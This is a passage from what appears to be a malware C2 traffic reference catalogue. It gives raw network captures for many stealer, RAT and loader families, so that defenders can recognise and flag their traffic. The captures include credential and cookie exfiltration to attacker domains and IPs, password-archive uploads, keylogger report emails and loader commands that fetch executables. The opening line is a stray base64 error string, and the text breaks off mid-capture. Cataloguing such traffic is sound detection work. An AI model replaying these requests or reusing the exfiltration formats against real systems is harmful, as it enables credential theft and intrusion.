VGhlIGlucHV0IGlzIG5vdCBhIHZhbGlkIEJhc2UtNjQgc3RyaW5nIGFzIGl0IGNvbnRhaW5zIGEgbm9uLWJhc2UgNjQgY2hhcmFjdGVyLCBtb3JlIHRoYW4gdHdvIHBhZGRpbmcgY2hhcmFjdGVycywgb3IgYW4gaWxsZWdhbCBjaGFyYWN0ZXIgYW1vbmcgdGhlIHBhZGRpbmcgY2hhcmFjdGVycy4g
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jssloader.png "JSSLoader")

#### Keybase
~~~
GET /panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356 HTTP/1.1
Host: pacificglobal.ga
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 04 Oct 2019 19:55:10 GMT
Content-Type: text/html
Content-Length: 985
Connection: keep-alive
Vary: Accept-Encoding
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Cache-Control: no-cache

<html><body><script type="text/javascript" src="/aes.js" ></script><script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var a=toNumbers("f655ba9d09a112d4968c63579db590b4"),b=toNumbers("98344c2eee86c3994890592585b49f80"),c=toNumbers("ee3d72471e3c40514be9a177719112c3");document.cookie="__test="+toHex(slowAES.decrypt(c,2,a,b))+"; expires=Thu, 31-Dec-37 23:55:55 GMT; path=/"; location.href="http://pacificglobal.ga/panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356&i=1";</script><noscript>This site requires Javascript to work, please enable Javascript in your browser or use a browser with Javascript support</noscript></body></html>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/keybase.png "Keybase")

#### Kpot stealer
Follow tcp stream, not http stream in wireshark
~~~
GET /ImgcsQGM6ZclLvqr/conf.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Host: allseasongudinc.tech

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 27 Aug 2019 13:52:09 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.1.28

194
KwV4X3wlPk10s8hXH869gjRybIA8vP7vCwSm1Z2WW5LpEMiELVOQvustrfDp9B9igx9Jz8+noWaPlvipqvlX1nEJsgEGpkK29iHNRB5rmSyH9hPAko1ndCVOfVjGwUO/THlWJSdlDlb0FyJA2+ji7xH/Hlcwx38AIJ1SHUpp+hYHUnavdTv5uJnIAoB23+3dt7f1I54mr2Pp+eddWPHgFeIL/2BeLqaWQL1IzY1EqZhS9oIluDYmojSWgWeu6mecE5suxDRksh0KOyA7518HX4ziYflt6gBOa+daqP42C7K7PspsZGUMTRIRKayAQIT84HYmE7a/jRK1twsOz8gdJIrbaOTLaZWx/4q3Nd8bAB2yH8PvCwRz2YVsmzjBv93n3ksOHYuFtO1GcnOk0Igj
0

POST /ImgcsQGM6ZclLvqr/conf.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/octet-stream
Content-Encoding: binary
Host: allseasongudinc.tech
Content-Length: 1965022

P@F,jbhNH2pUP_s..tzH	W-.z.Cb]_u.PBCy9bhNH2pUdoG4PBCy9bhNH2pUdo.r...<|XH	:S.7...U 2'.M.4.!Q.:..!@..*.]
.=.q.:.."G..,.eP+...I.%A3L$OI4l+,.B.@.R+rqh{w@.TP.p.5`]+~
.{vA	TQ.y8.%
A%]>%m.V.GDq.Acn]v.b{vK.U^D{.GbTVs.ZqsO.[]xx.I_W_q.ir{H3Hbn.t6.-#.q...?p.-.r.7'.
%Q"."	I.	:)n=<..(G?$7%n..*'E.	'.(_9'0%u
..qcE.1;.b~6;
4h;..z4_%)z}...Mxh
'&U^6..h>arqM3T[vy.Fmn\w.c{vM.h[~~.I`R_t
ZqsO.[Xvy8Z_7=.|...so_Zh.g9.YZv.`..HxS+
}.3.S-u..tw8z![~xq6a&I#Y>!+..Sb,!\.{..*.ZssK
h^}p.Ec\et.hqzL
Pb}x.FlQYw.iHpI.UQ~p.z.n<.w...+3&'.u.@d\_~.eH!.W.F-'___U_u.ZtpA.W^vB.@mWVr.bHpI.TQ{~.Cln\w.g{sA.hBDhm6."&.q...?.+$.
.P...%V50..I../<S,.
.5[#-%
e5. ,].&8,([;+&
e..9.z@.!=.f.l7.Mob.	.@fn..C"{2JT..=.|=x#=.m.r. V.^z-Z]...&Mc."1t._..`'<..%S?.7@V[Y4.m>
;.qSZ#7.T.F-'___V^s.d{qA.Vb}~.IgRYv.fHpI.SX{q.zfVZv.hpuI.h[~~.Ie\^M.Z..73SF.}.GmQ_s.`lrI.RZw{.Fd\\s.gsqL.ZF..x$$U#.ea.".W.<-x.z4..*@~!,..hZ.|.DlVWq.ZqtO.U_{{.@_W_..iqwI3QZ{x.Hm\Zu>cruN.RP.B.zu;).r...<f$...~5.^O.F1 !.K>	>8V.!.3
]30,
V....[.1..4h.-,.P....].	/;.b...N...:E8.4..Me";3..Q.}0m .>)&A.'9.P6'D.S.0..(_~!,..hQ|y.zfR^~.gwpO	h[~p.IfP_M.arwL.QZ|
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/kpot.png "Kpot stealer")

#### KrugBot
~~~
POST /absc/index.php HTTP/1.0
Host: raiseyourdongers.wtf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 224

tSVkhHUFWeXjujTxCNBQl7h1QW2zElMRx+g8ceDNF/4mUj4PV8MaCjFjhqCGYGprTPLjXu5i
w+xWBGqDB44jDCJcr66AgCqhZYhj04B5PCPqMNaf8It2IfuX9Ffysaqp+tjcUhGW3JH1nJk8
ud1kko0C6+v/tp2PLOVR0ac3GacRi0dUf/+ASue6AJNOfh4WliURnubviRXJkcj+5f7vA3Xa
jg==
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krugbot.png "Krugbot")

#### Krypton Stealer
~~~
POST /connect_meta.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Client
Host: orl05511cn.temp.swtest.ru
Content-Length: 26
Cache-Control: no-cache

id=01&message=test_message
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krypton.png "KryptonStealer")

#### Loda
I've never seen this without the beta flah
~~~
x|lugocv|x|admin|WIN_7|X86| |Disabled|1.1.2|ddd|Pr720X21280X3|Desktop|0|beta

ZeXro0
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/loda.png "Loda")

#### Lokibot

follw tcp stream, not http stream in wireshark
~~~
POST /sky/five/fre.php HTTP/1.0
User-Agent: Mozilla/4.08 (Charon; Inferno)
Host: fueda.info
Accept: */*
Content-Type: application/octet-stream
Content-Encoding: binary
Content-Key: 8DAA705A
Content-Length: 176
Connection: close

..'.......ckav.ru..
...a.d.m.i.n.......U.S.E.R.-.P.C.......U.S.E.R.-.P.C......................+................0...8.5.6.9.A.A.F.F.6.3.A.A.A.7.1.D.8.0.4.0.0.E.2.5.....Rqbay....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lokibot.png "Lokibot")

#### Metamorpho BR Banker
~~~
POST / HTTP/1.0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 249
Host: 18.217.112.176
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: identity
User-Agent: Mozilla/3.0 (compatible; Indy Library)

spxndja=HERETEVFDEVFJERERFEERFFEXERFJFGFKER&kfcemfgj=CCO&gvtsavp=EFMFM&ixjpblda=HEDEEDOEGDODXCPDKDMDMDYEFDXEEDSCMEHFAFFCCDACMCTCSCMDCCXCQCSDUDLCMCMDOFFEXFDFAFKEYCCCKEFFFFAFLEVEUCCEDFLERFLEVFKCLCMCMEHFAFFEUFGFOFKCCDNEVEWEVFFEUEVFJCMCYCWDLCM&xhwen=YDL

HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 15:18:12 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 15:18:12 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
~~~
~~~
POST /hooponopono/puma.php HTTP/1.0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Host: leavenois.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/3.0 (compatible; Indy Library)

vv=OP22--22-10&vw=&mods=&uname=VVNFUi1QQw%3D%3D&cname=Ti05Ng%3D%3D&os=V2luZG93cyA3IFByb2Zlc3Npb25hbDYuMTc2MDEtNjQ%3D&is=&iss=SUUuQXNzb2NGaWxlLkhUTQ%3D%3D&iav=

HTTP/1.0 200 OK
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Date: Tue, 22 Oct 2019 20:06:32 GMT
Server: LiteSpeed
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorpho.png "Metamorpho")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorfo-1.png "Metamorpho")

#### MilkyBoy
~~~
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
User-Agent: Adzq41ceq52e353512hSfj
Content-Length: 45
Host: qqwveqwevqwe.duckdns.org:10

key:Adz32151295uy129v5nqwrnvqwkjn5rv12n5vhSfj

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 8593928
Server: Werkzeug/0.15.4 Python/2.7.6
Date: Wed, 09 Oct 2019 22:09:57 GMT

TVqQAAMAAAAEAAAA/

POST / HTTP/1.1
Host: qqwveqwevqwe.duckdns.org:10
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.11.1
key: Adz32516047vhSfj
filename: 58759853857.zip
Content-Length: 5334
Content-Type: multipart/form-data; boundary=80790cc2554f462cb375dcc301f5c66a

--80790cc2554f462cb375dcc301f5c66a
Content-Disposition: form-data; name="payload"; filename="payload"

PK........G.IO............
...PASSWORDS/PK........G.IO+&.6v...........e.txt=.I.. .....Wx./X....%......g[VN6A...z~......x}....xH......*b....<@.W.P..X......,|*.]$..
}..%.	.C{....7.W......Bas.....PK........I.IO................sys.txt].Ok.@....|..S...&jho.B..........R.[.OK(..].K.2.7.73o~...'..6D.>q....U..u.. .W..x.0....=.T.#...<0"....W.k.. .;..J1.q;X.{kz..S;_.f.t...D..Gh@......Q.v@G=}....m"...............Yy..!1U...i.xe...B.T%..	{5.....m...3.>....3.J..]Vh......&Y.@.8...T~1B!....l
kk.:......m$....B.._.E........PK........G.IO................PASSWORDS/CBase/PK........G.IO................PASSWORDS/FBase/PK........G.IO................PASSWORDS/CBase/Google/PK........G.IO).L
........#...PASSWORDS/CBase/Google/cookies.json....PK........G.IO".......[...)...PASSWORDS/CBase/Google/loginpasswords.txt...=..r..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%....U.g...x...Z.sy...2......(X).r.......
.d...V:....%...r.$.......d@|cS3...PK........G.IO."{.o...C..."...PASSWORDS/CBase/Google/webdata.txt...=..r..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%......&..x...V.cy..2..K..sS.....2Ss@..\>.P........b.0.PK........G.IO................PASSWORDS/FBase/Mozilla/PK........G.IOp.0.$.......$...PASSWORDS/FBase/Mozilla/cookies.json..Mk.@.....!......$......Vl$..~.......-..j-...R/s.y..}.....8..q.zm.[..n.~U..e).z..7.7..............
...^z.6..t#....(@W.r43...U.iT.-.....%6.....1......}5......iG..Ut.i|".I....$...~...Q.yr_.....tA."..
@.p...',.!O!e..T.v.6..T.hEY*..H..Sq)....L......~...CD....E.0..Sa.T	..`b.J*i...G..."xpF.......PK........o.)M0..W............PASSWORDS/FBase
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-1.png "Milkyboy 1")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-2.png "Milkyboy 2")

#### MirageFox
~~~
POST http://172.16.100.1/result%3Fhl%3Den%26meta%3Dghumeaylnlfdxfircvscxggbwkfnqdu HTTP/1.0
Accept: *.*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)
Proxy-Connection: Keep-Alive
Content-Length: 528
Encoding: gzip, deflate
Accept-Language: en-us
Host: 172.16.100.1
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/miragefox.png "MirageFox")

#### Nanocore

flag on "38 00 00 00 17" pattern
~~~
00000000  38 00 00 00 17 f5 4b 2c c3 65 ca 9f eb bc fd 67   8.....K, .e.....g
00000010  ad 6d 0e c4 33 7d b6 40 17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
00000020  04 ea d0 16 f2 cf 3e 51 29 18 55 e5 1c 7a 6a 91   ......>Q ).U..zj.
00000030  03 99 38 f7 ac 3b f7 89 85 2e c4 d8               ..8..;.. ....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-38.png "Nanocore 38")

flag on "40 00 00 00 17" pattern:
~~~
00000000  40 00 00 00 17 f5 4b 2c c3 65 ca 9f eb bc fd 67   @.....K, .e.....g
00000010  ad 6d 0e c4 33 7d b6 40 17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
00000020  04 ea d0 16 87 30 8f fa 78 9d 2a 01 c2 51 ee 07   .....0.. x.*..Q..
00000030  bd e7 23 95 3e ab a1 04 ca 56 b3 fb b7 9b b7 3a   ..#.>... .V.....:
00000040  13 e5 2b 52                                        ..+R
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-40.png "Nanocore 40")

flag on "50 00 00 00 82" pattern:
~~~
00000000  50 00 00 00 82 c8 36 7a 87 1b 91 70 6b 20 7f 17   P.....6z ...pk ..
00000010  ea 86 3a e9 07 fc 40 ae 0f ac bc f5 f2 6d f3 98   ..:...@. .....m..
00000020  71 7a 0b 19 4c 8e 58 bb 6c 69 5a 99 55 4a 72 c6   qz..L.X. liZ.UJr.
00000030  92 ed 39 fe 74 2a 9d b4 09 ca 5a 4a 83 dc 99 16   ..9.t*.. ..ZJ....
00000040  0a ea 28 ad ba f6 87 d0 b7 4d 45 78 6a 71 84 19   ..(..... .MExjq..
00000050  34 cc c6 79                                        4..y
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-50.png "Nanocore 50")

#### NetSupport RAT
~~~
POST http://179.43.159.246/fakeurl.htm HTTP/1.1
User-Agent: NetSupport Manager/1.3
Content-Type: application/x-www-form-urlencoded
Content-Length:    22
Host: 179.43.159.246
Connection: Keep-Alive

CMD=POLL
INFO=1
ACK=1
HTTP/1.1 200 OK
Server: NetSupport Gateway/1.6 (Windows NT)
Content-Type: application/x-www-form-urlencoded
Content-Length:    60
Connection: Keep-Alive

CMD=ENCD
ES=1
DATA=.g+$.{.. \....W...bb...).w}..o..X..xf...
POST http://179.43.159.246/fakeurl.htm HTTP/1.1
User-Agent: NetSupport Manager/1.3
Content-Type: application/x-www-form-urlencoded
Content-Length:   232
Host: 179.43.159.246
Connection: Keep-Alive

CMD=ENCD
ES=1
DATA=u.2h.r..4.]..%y-.....=I...D3.W..i.7?....=@....F.f....&t.[..6ra..L.....?....>......5T.m.<..O....a.g.qwjW..I{~i...1......\.bH8Z&8.|gY@:......7. .\.(.K(...oC.x.m-.o.D.t....Lv...{.............=J.J...f.V=@.`t..i......
POST http://179.43.159.246/fakeurl.htm HTTP/1.1
User-Agent: NetSupport Manager/1.3
Content-Type: application/x-www-form-urlencoded
Content-Length:    77
Host: 179.43.159.246
Connection: Keep-Alive

CMD=ENCD
ES=1
DATA=l3.<(T{.E.....V....k.9|||$(m..$C.M..=I0`!.....^.....?sq. 
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/netsupport.png "NetSupport RAT")

#### Netwire
flag on "41 00 00 00 99" pattern in initial packet
~~~
00000000  41 00 00 00 99 80 3a e0 e8 5f d7 ea 8c af 76 cc   A.....:. ._....v.
00000010  c4 cc ad 5a 10 72 cc d0 5e 64 d8 50 80 fc b6 e6   ...Z.r.. ^d.P....
00000020  54 25 bf e0 ea 7f 7b e4 ff 54 70 e8 eb c0 fa 80   T%....{. .Tp.....
00000030  a0 a0 f3 a0 b0 0a 94 04 84 31 7c 3f e7 8c 90 c5   ........ .1|?....
00000040  ce c4 11 97 d9                                     .....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/netwire.png "Netwire 40")

#### Neutrino
~~~
POST /panel/52/tasks.php HTTP/1.0
Host: slipcentral.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0
Content-type: application/x-www-form-urlencoded
Cookie: auth=bc00595440e801f8a5d2a2ad13b9791b
Content-length: 180

_wv=Y21kJjkwMDU5YzM3LTEzMjAtNDFhNC1iNThkLTJiNzVhOTg1MGQyZiZZV1J0YVc0Z09pQlZVMFZTTFZCRElEb2dWVk5GVWkxUVF3JTNEJTNEJldpbmRvd3MlMjA3JTIwKDMyLWJpdCkmMCZOJTJGQSY1LjEmMDguMTAuMjAxOSZOT05FHTTP/1.0 404 Not Found
Connection: close
X-Powered-By: PHP/5.6.40
Content-Type: text/html; charset=UTF-8
Content-Length: 1251
Date: Tue, 08 Oct 2019 00:52:53 GMT
Server: LiteSpeed
Vary: User-Agent

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /panel/52/tasks.php was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html><!---MTU3MDI2MTQzNjkyODM2MyNyYXRlIDUjMTQ2MzAyMDA2NjUxNjE2OSNzY3JlZW5zaG90IzE0NjkxMDAwOTY4ODIwMDAjYm90a2lsbGVyIzE1NzAyNjMxNzk5MTUwMDAjTE9BREVSIGh0dHA6Ly9zbGlwY2VudHJhbC5jb20vcGFuZWwvNTIvdXBsb2FkL2twKDEpLmV4ZSBydW4jMTU3MDI1OTIyNTI4Njg5NCNGSU5EICUyQWRhdCUyQSMxNTcwMjYyMjA3Njc0NDQzI0NNRC1SZXN1bHQgaXBjb25maWcjMTU3MDI2MzE4ODkxMzkyOCNETlMgaHR0cDovL3NsaXBjZW50cmFsLmNvbS9wYW5lbC81Mi91cGxvYWQveHNsYXllciBjdnYgY2hlY2tlci5leGUgcnVuIzE1NzAyNjM3NzM3MjkxNjUjRklORCB0eHQjMTU3MDI2Mzc4MDYwOTkwNCNGSU5EIGpwZyMxNTcwMjYyMjA3ODg2MjAwI0NNRC1SZXN1bHQgaXBjb25maWcjMTU3MDI2MjMwNDMzOTAxNyNGSU5EIHdlYmluamVjdHMudHh0IzE1NzAyNjI1MTM0ODkxMDYjRklORCAlNUMlMjZxdW90JTNCdHh0JTVDJTI2cXVvdCUzQiMxNTcwMjYzMzQxNzU4MzE3I0xPQURFUiBodHRwOi8vc2xpcGNlbnRyYWwuY29tL3BhbmVsLzUyL3VwbG9hZC96ZXVzIGNhbmFkYS5leGUgcnVuIzE1NzAyNzM4OTk0MTc4NTMjQ01ELVJlc3VsdCBwc2xpc3QjMTU3MDI3Mjk4MTIxNDQ0NSNDTUQtUmVzdWx0IHBzbGlzdCMxNTcwMjYzNzI2NjY5NzcyI0NNRC1SZXN1bHQgdGFza2xpc3Qj--->
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/neutrino.png "Neutrino")

#### Orcus RAT
Machine name is SNI
~~~
....j...f..].....*".....L...^...xG.F..... ...../.5...
.....	.
.2.8.......%..........
...USER-PC.
......................M..]......~$....q.....d..o..t{8Y..& V5.....Xj..[...d.'v...3Y..9...}.....................0...0..0.......GY.I..l.C.!d.((n0
.	*.H..
.....0!1.0...U....OrcusServerCertificate0 .
181004205345Z..20691004205345Z0!1.0...U....OrcusServerCertificate0..0
.	*.H..
.........0..........C.}q.
.%/.J..U..+U!...Zk.&5.".	.on......w..NA..n..... ...ZM!...g..]....]Z...,
~h..?.......i'........u..... .r.|.o....2..A1KU.....0
.	*.H..
...........}.#zu....*...eW.+..c8..qk^.8....F..S"u.:..=...C  .K.z....P...Y..M[..d.2p..U....O=.|*4-....S;.b...I......1t.~Z..e.ETxk...r(u_g........a...?.y$t..LR.:..>...3j..gT		.....DJH..N.MJD.eb...I...}.V^5a...\@.S..........4..u_...l$y....k*......|...D..Z
.8S...i..z.9.&..5F.......A..V.c\.{..I...1|.W..td?...Y.....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/orcus.png "Orcus RAT")

#### Origin Keylogger
~~~
From: sp@globalfinancel.com
To: new@globalfinancel.com
Date: 17 Oct 2019 15:03:43 +0000
Subject: admin/USER-PC Recovered Accounts
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

Time: 10/17/2019 15:03:33<br>UserName: admin<br>ComputerName: USE=
R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 4095.61 MB<br>IP: 18=
5.117.118.92=0A<hr>URL:      https://www.facebook.com/<br>=0D=0AU=
sername: honey@pot.com<br>=0D=0APassword: honeypass356<br>=0D=0AA=
pplication: Chrome<br>=0D=0A<hr>=0D=0AURL:      192.168.1.1<br>=0D=0A=
Username: honey@pot.com<br>=0D=0APassword: honeypass356<br>=0D=0A=
Application: Outlook<br>=0D=0A<hr>=0D=0A

From: sp@globalfinancel.com
To: new@globalfinancel.com
Date: 17 Oct 2019 15:03:43 +0000
Subject: admin/USER-PC Recovered Cookies
Content-Type: multipart/mixed;
 boundary=--boundary_0_33ca7fc1-78dd-4797-bb1b-819697f17244


----boundary_0_33ca7fc1-78dd-4797-bb1b-819697f17244
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

Time: 10/17/2019 15:03:34<br>UserName: admin<br>ComputerName: USE=
R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 4095.61 MB<br>IP: 18=
5.117.118.92=0A<hr>
----boundary_0_33ca7fc1-78dd-4797-bb1b-819697f17244
Content-Type: application/octet-stream; name=4dz3xb0p.hda.zip
Content-Transfer-Encoding: base64
Content-Disposition: attachment

UEsDBBQAAAgIAIRp/k5nVtI5VAoAAABwAAAjAAAANGR6M3hiMHAuaGRhL0Nocm9tZS9E
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/origin.png "Origin Keylogger")

#### Ostap
~~~
POST /angola/mabutu.php?pi=29h&tan=cezar&z=662343339&n=0&u=20&an=9468863238 HTTP/1.1
Connection: Keep-Alive
Content-Type: text/plain; Charset=UTF-8
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Content-Length: 1034
Host: 185.180.199.91

Microsoft Windows 7 Professional 6.1.7601*Locale:0409
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sent64.jse
USER-PC*DELL*DELL*0

System Idle Process*null
System*null
smss.exe*null
csrss.exe*null
wininit.exe*null
csrss.exe*null
winlogon.exe*null
services.exe*null
lsass.exe*null
lsm.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
spoolsv.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
dwm.exe*C:\Windows\system32\Dwm.exe
explorer.exe*C:\Windows\Explorer.EXE
taskhost.exe*C:\Windows\system32\taskhost.exe
SearchIndexer.exe*null
qemu-ga.exe*null
audiodg.exe*null
WmiPrvSE.exe*null
SearchProtocolHost.exe*null
windanr.exe*C:\Windows\system32\windanr.exe
OSPPSVC.EXE*null
wscript.exe*C:\Windows\system32\wscript.exe
wscript.exe*C:\Windows\system32\wscript.exe
SearchFilterHost.exe*null
WINWORD.EXE*C:\Program Files\Microsoft Office\Office14\WINWORD.EXE
WmiPrvSE.exe*null
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-1.png "Ostap")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-2.png "Ostap")

#### ParasiteHTTP Loader
~~~
POST /index.php HTTP/1.1
Accept: */*
Host: 80.233.134.242
Content-Type: application/x-www-form-urlencoded
Connection: Close
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Content-Length: 280
Cache-Control: no-cache

BF6472F6DC3=Pi5tSiBItP-2ZyuFJlr31Jp58O0HzR74v0b4l2HaoHH537FeTxgg-msYkTvX6SSJ8FswUtoTg4O86o2HyWec2zuU6VFzTwgaFYw_28nFRIqcJv8TqrV7SYgFKSpbqY8aZhEcHY982M_flvAHMCjsD8-fxezzV5BSBDBbfYb5WZvBrsbJVlPwXYFmETrm7CrWF5LwvEFhu1Ecp14ymv1xPoCG0vfqAv5tsUn0H7mA5R5g7HAo2c3_r9fuZUtw9CKD46G2JnBF-A==

HTTP/1.1 200 OK
Date: Tue, 28 May 2019 08:46:26 GMT
Server: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.37
X-Powered-By: PHP/5.6.37
Set-Cookie: PHPSESSID=s3l4jdfsc8nkjghcevlshn3d67; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 416
Connection: close
Content-Type: text/html; charset=utf-8

8jQG4riRhJFWMlJ9RTKeV7k45+I3REM8JjIIBZ2ttxzjDFxOX7VjxuypIrJn9cQ1ZMg6fvgWSSpto3sivUfvUCHWLzb2ljPhPugPTYb0KsgResnAIFl+aoqF5m9bCyBd6PMoRLdOdsuDW+E3wrb7ZNpApXlX2htDZRNhaqfST8eBE9Cvl7H0vyUzY+BfH5M4fvvt71DCRt2OP31tgu7aMMxM0mUWvBBZcNpeZzLRdMFd0Ea1u3oM+vLWrhFLYGuCWN6TPaqlEpw/9pgLUI8BhxUYFOJvyTRIFwXmlQPWMY6qg0/l+b5Ha+SYCnLtw8Uyqilil+OBM+KM5MT4C4l9vkXsv/ID9X8ZRr2l9cHzlW5J7sLVrGeH26KmBrjqBM3c4Ini4VTZZCr5KDrsRpi21NaheQLGLA==
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasitehttp.png "ParasiteHTTP Loader")

#### Pony
Follow tcp stream, not http stream in wireshark
~~~
POST /mlu/forum.php HTTP/1.0
Host: spausence.com
Accept: */*
Accept-Encoding: identity, *;q=0
Accept-Language: en-US
Content-Length: 369
Content-Type: application/octet-stream
Connection: close
Content-Encoding: binary
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)

..|Rk.. ."6d0..)/.....Lo..l{;..:.NJT;.G..3P..n...{.i..eLX..j...K.N.......A.
n.%.....r..&..........J.l.V..of..T..V$... .L...5....6F...9.)......(...
.(O........*[z\.....N....=..4..];....L.W......Q...*.S....V.	7.4.L..v..oi...x..W7....{.....V)...:...1...R..V.......+...]m 
.......B...|D..t.Y.{..............{W.f.._i...i.!..d.C...r.......A.,.z....ta..m..
5!...w+.....p....!0

HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Thu, 03 Oct 2019 17:17:59 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.4.45

..
.....f>k.X.......
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony.png "Pony")

#### Pony Loader
~~~
POST /eng/gate.php HTTP/1.0
Host: www.jicago-jp.com
Accept: */*
Accept-Encoding: identity, *;q=0
Content-Length: 199
Connection: close
Content-Type: application/octet-stream
Content-Encoding: binary
User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)

HTTP/1.1 200 OK
Date: Wed, 09 Oct 2019 08:44:06 GMT
Server: Apache
Connection: close
Content-Type: text/html; charset=UTF-8

STATUS-IMPORT-OK
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony-loader.png "Pony Loader")

#### Predator Pain Keylogger
~~~
From: pain@globalfinancel.com
To: pain@globalfinancel.com
Date: 17 Oct 2019 08:04:48 -0700
Subject: Predator Pain v13 - Server Ran - [XRWJAM272278424]
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

This is an email notifying you that XRWJAM272278424 has ran your =
logger and emails should be sent to you shortly and at interval c=
hoosen.=0D=0A =0D=0APredator Logger Details: =0D=0AServer Name: R=
egSvcs.exe=0D=0AKeylogger Enabled: False=0D=0AClipboard-Logger En=
